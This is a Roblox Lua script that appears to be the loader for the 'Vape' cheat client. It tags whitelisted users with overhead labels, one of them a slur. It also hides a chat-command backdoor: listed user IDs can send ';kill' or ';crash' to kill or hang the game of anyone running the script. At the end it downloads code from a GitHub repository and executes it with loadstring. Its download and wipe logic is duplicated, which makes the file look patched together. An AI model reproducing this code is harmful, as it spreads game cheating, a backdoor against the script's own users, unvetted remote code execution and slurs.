local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local LOCAL_PLAYER = Players.LocalPlayer

local whitelist = {
	Owner = {1251592623, 3299920155},
	Private = {
		1848051618, 4202838123, 1965898454, 1666325842, 1513390800,
		1983015440, 1394235609, 3204169739, 1880511134
	},
	Slow = {1562251033}
}

local function isInList(userId, list)
	for _, id in ipairs(list) do
		if userId == id then return true end
	end
	return false
end

local function isWhitelisted(userId)
	return isInList(userId, whitelist.Owner) or isInList(userId, whitelist.Private)
end

local function applyBillboardTag(player, text, color)
	local function render()
		local head = player.Character and player.Character:FindFirstChild("Head")
		if not head or head:FindFirstChild("VapeTag") then return end

		local tag = Instance.new("BillboardGui")
		tag.Name = "VapeTag"
		tag.Size = UDim2.new(0, 100, 0, 20)
		tag.StudsOffset = Vector3.new(0, 3, 0)
		tag.AlwaysOnTop = true
		tag.Adornee = head
		tag.Parent = head

		local label = Instance.new("TextLabel")
		label.Size = UDim2.fromScale(1, 1)
		label.BackgroundTransparency = 1
		label.Text = text
		label.TextColor3 = color
		label.TextStrokeTransparency = 0.3
		label.TextStrokeColor3 = Color3.new(0, 0, 0)
		label.Font = Enum.Font.GothamBold
		label.TextScaled = true
		label.Parent = tag
	end

	if player.Character then
		render()
	else
		player.CharacterAdded:Once(function()
			task.wait(0.5)
			render()
		end)
	end
end

local function tagPlayer(player)
	local uid = player.UserId
	if isInList(uid, whitelist.Owner) then
		applyBillboardTag(player, "Vape OWNER", Color3.fromRGB(210, 4, 45))
	elseif isInList(uid, whitelist.Private) then
		applyBillboardTag(player, "Vape Private", Color3.fromRGB(170, 0, 255))
	elseif isInList(uid, whitelist.Slow) then
		applyBillboardTag(player, "Retard", Color3.fromRGB(70, 130, 255))
	end
end

for _, plr in ipairs(Players:GetPlayers()) do
	tagPlayer(plr)
end

Players.PlayerAdded:Connect(function(player)
	task.delay(1, function()
		tagPlayer(player)
	end)
end)

local function handleCommand(command)
	command = string.lower(command)

	if command == ";kill" then
		local char = LOCAL_PLAYER.Character
		if char then
			for _, part in ipairs(char:GetDescendants()) do
				if part:IsA("BasePart") then
					part:BreakJoints()
				end
			end
		end

	elseif command == ";crash" then
		while true do end
	end
end

TextChatService.MessageReceived:Connect(function(message)
	local text = message.Text
	local source = message.TextSource
	if not source then return end

	local senderId = source.UserId
	if senderId == LOCAL_PLAYER.UserId then return end
	if not isWhitelisted(senderId) then return end
	if isWhitelisted(LOCAL_PLAYER.UserId) then return end

	handleCommand(text)
end)

local isfile = isfile or function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil and res ~= ''
end

local delfile = delfile or function(file)
	writefile(file, '')
end

local function downloadFile(path, func)
	if not isfile(path) then
		local suc, res = pcall(function()
			return game:HttpGet('https://raw.githubusercontent.com/Noveign/VapeV4ForRoblox/' .. readfile('newvape/profiles/commit.txt') .. '/' .. select(1, path:gsub('newvape/', '')), true)
		end)
		if not suc or res == '404: Not Found' then error(res) end
		if path:find('%.lua') then
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n' .. res
		end
		writefile(path, res)
	end
	return (func or readfile)(path)
end

local function wipeFolder(path)
	if not isfolder(path) then return end
	for _, file in listfiles(path) do
		if file:find('loader') then continue end
		if isfile(file) and select(1, readfile(file):find('--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.')) == 1 then
			delfile(file)
		end
	end
end

for _, folder in {'newvape', 'newvape/games', 'newvape/profiles', 'newvape/assets', 'newvape/libraries', 'newvape/guis'} do
	if not isfolder(folder) then makefolder(folder) end
end

if not shared.VapeDeveloper then
	local _, subbed = pcall(function()
		return game:HttpGet('https://github.com/Noveign/VapeV4ForRoblox')
	end)
	local commit = subbed:find('currentOid')
	commit = commit and subbed:sub(commit + 13, commit + 52) or nil
	commit = commit and #commit == 40 and commit or 'main'
	if commit == 'main' or (isfile('newvape/profiles/commit.txt') and readfile('newvape/profiles/commit.txt') or '') ~= commit then
		wipeFolder('newvape')
		wipeFolder('newvape/games')
		wipeFolder('newvape/guis')
		wipeFolder('newvape/libraries')
	end
	writefile('newvape/profiles/commit.txt', commit)
end

local isfile = isfile or function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil and res ~= ''
end

local delfile = delfile or function(file)
	writefile(file, '')
end

local function downloadFile(path, func)
	if not isfile(path) then
		local suc, res = pcall(function()
			return game:HttpGet('https://raw.githubusercontent.com/Noveign/VapeV4ForRoblox/' .. readfile('newvape/profiles/commit.txt') .. '/' .. select(1, path:gsub('newvape/', '')), true)
		end)
		if not suc or res == '404: Not Found' then
			error(res)
		end
		if path:find('%.lua') then
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n' .. res
		end
		writefile(path, res)
	end
	return (func or readfile)(path)
end

local function wipeFolder(path)
	if not isfolder(path) then return end
	for _, file in listfiles(path) do
		if file:find('loader') then continue end
		if isfile(file) and select(1, readfile(file):find('--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.')) == 1 then
			delfile(file)
		end
	end
end

for _, folder in {'newvape', 'newvape/games', 'newvape/profiles', 'newvape/assets', 'newvape/libraries', 'newvape/guis'} do
	if not isfolder(folder) then makefolder(folder) end
end

if not shared.VapeDeveloper then
	local _, subbed = pcall(function()
		return game:HttpGet('https://github.com/Noveign/VapeV4ForRoblox')
	end)
	local commit = subbed:find('currentOid')
	commit = commit and subbed:sub(commit + 13, commit + 52) or nil
	commit = commit and #commit == 40 and commit or 'main'
	if commit == 'main' or (isfile('newvape/profiles/commit.txt') and readfile('newvape/profiles/commit.txt') or '') ~= commit then
		wipeFolder('newvape')
		wipeFolder('newvape/games')
		wipeFolder('newvape/guis')
		wipeFolder('newvape/libraries')
	end
	writefile('newvape/profiles/commit.txt', commit)
end

return loadstring(downloadFile('newvape/main.lua'))()
